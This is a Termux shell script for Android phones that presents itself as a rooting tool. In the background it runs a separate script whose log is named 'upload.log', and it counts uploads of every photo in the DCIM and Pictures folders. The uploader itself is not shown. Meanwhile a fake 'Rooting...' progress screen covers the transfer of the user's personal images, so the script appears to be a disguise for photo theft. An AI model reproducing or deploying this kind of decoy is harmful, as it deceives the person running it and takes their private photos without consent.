#!/data/data/com.termux/files/usr/bin/bash

LOG="$HOME/T/upload.log"

RED='\033[1;31m'
RESET='\033[0m'

TOTAL=$(find /storage/emulated/0/DCIM /storage/emulated/0/Pictures \
-type f \
\( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.heic" -o -iname "*.heif" \) \
-not -path "*/.backup/*" \
2>/dev/null | wc -l)

: > "$LOG"

bash "$HOME/T/t.sh" > "$LOG" 2>&1 &
PID=$!

while kill -0 "$PID" 2>/dev/null
do
    SUCCESS=$(grep -c "SUCCESS" "$LOG" 2>/dev/null)
    FAILED=$(grep -c "^FAILED:" "$LOG" 2>/dev/null)

    PROCESSED=$((SUCCESS + FAILED))

    if [ "$TOTAL" -gt 0 ]; then
        PERCENT=$((PROCESSED * 100 / TOTAL))
    else
        PERCENT=0
    fi

    FILLED=$((PERCENT * 20 / 100))
    EMPTY=$((20 - FILLED))

    BAR=$(printf '%*s' "$FILLED" '' | tr ' ' '#')
    BAR="${BAR}$(printf '%*s' "$EMPTY" '' | tr ' ' '-')"

    clear

    printf "${RED}"
    echo "██████╗  ██████╗  ██████╗ ████████╗"
    echo "██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝"
    echo "██████╔╝██║   ██║██║   ██║   ██║"
    echo "██╔══██╗██║   ██║██║   ██║   ██║"
    echo "██║  ██║╚██████╔╝╚██████╔╝   ██║"
    echo "╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝"
    echo
    echo "╔════════════════════════════════╗"
    echo "║         Terminal ROOT         ║"
    echo "╠════════════════════════════════╣"
    printf "║  UNROOT : %-14s║\n" "$TOTAL"
    printf "║  Processed    : %-14s║\n" "$PROCESSED"
    printf "║  Successful   : %-14s║\n" "$SUCCESS"
    printf "║  Failed       : %-14s║\n" "$FAILED"
    echo "║                                ║"
    printf "║  Progress : [%s] %3d%%   ║\n" "$BAR" "$PERCENT"
    echo "║                                ║"
    echo "║  Rooting...                    ║"
    echo "╚════════════════════════════════╝"
    printf "${RESET}"

    sleep 1
done

SUCCESS=$(grep -c "SUCCESS" "$LOG" 2>/dev/null)
FAILED=$(grep -c "^FAILED:" "$LOG" 2>/dev/null)
PROCESSED=$((SUCCESS + FAILED))

if [ "$TOTAL" -gt 0 ]; then
    PERCENT=$((PROCESSED * 100 / TOTAL))
else
    PERCENT=100
fi

clear

printf "${RED}"
echo "██████╗  ██████╗  ██████╗ ████████╗"
echo "██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝"
echo "██████╔╝██║   ██║██║   ██║   ██║"
echo "██╔══██╗██║   ██║██║   ██║   ██║"
echo "██║  ██║╚██████╔╝╚██████╔╝   ██║"
echo "╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝"
echo
echo "╔════════════════════════════════╗"
echo "║        ✅ ROOT STATUSH      ║"
echo "╠════════════════════════════════╣"
printf "║  ROOT FOUND : %-14s║\n" "$TOTAL"
printf "║  ROOTing    : %-14s║\n" "$PROCESSED"
printf "║  Successful   : %-14s║\n" "$SUCCESS"
printf "║  Failed       : %-14s║\n" "$FAILED"
printf "║  Progress     : %3d%%           ║\n" "$PERCENT"
echo "╚════════════════════════════════╝"
printf "${RESET}"
